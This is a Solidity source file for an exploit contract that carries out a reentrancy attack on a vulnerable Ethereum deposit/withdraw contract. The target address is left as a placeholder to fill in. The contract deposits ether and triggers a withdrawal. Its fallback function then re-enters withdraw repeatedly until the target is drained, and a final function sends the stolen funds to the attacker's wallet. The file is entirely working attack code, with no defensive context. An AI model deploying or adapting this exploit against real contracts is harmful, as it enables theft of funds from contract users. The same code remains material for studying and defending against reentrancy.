interface IReentrancy {
    function deposit() external payable;
    function withdraw(uint _amount) external;
    function getMyBalance() external returns (uint);
}

pragma solidity ^0.6.0;

contract ExpReentrancy {
    IReentrancy vulnTarget = IReentrancy(0x0000000000000000000000000000000000000000); // setup target contract with target interface, replace 0x0 with target contract address
    uint baseAmount = 1 ether; // set the base amount per use
    
    function getTargetBalance() public view returns (uint) {
        return address(vulnTarget).balance; // get ether balance in target contract
    }
    
    function depositFromExpContractToTarget() public payable {
        vulnTarget.deposit.value(baseAmount)(); // deposit ether from exploitContact to target contract
    }
    
    function withdrawFromTargetToExpContract() public payable returns (uint) {
        vulnTarget.withdraw(baseAmount); // withdraw ether from target to exploitContract
        return vulnTarget.getMyBalance(); // show balance after withdraw to exploitContract
    }
    
    function getExpContractBalaceInTarget() public returns (uint) {
        return vulnTarget.getMyBalance(); // get exploitContract balance in target contract
    }
    
    function withdrawFromExpContractToAttacker() public {
        msg.sender.transfer(address(this).balance); // with draw funds from exploitContract to sender (attacker wallet)
    }
    
    function thisBalance() public view returns (uint) {
        return address(this).balance; // get ether balace in exploitContract
    }
    
    // set fallback to be recursive loop (withdraw() -> require -> msg.call.value -> fallback() -> withdraw() -> ...)
    fallback() external payable {
        // check balance in target contract and execute withdraw when balance in target more than base amount
        if(getTargetBalance() >= baseAmount) {
            vulnTarget.withdraw(baseAmount);
        }
    }
}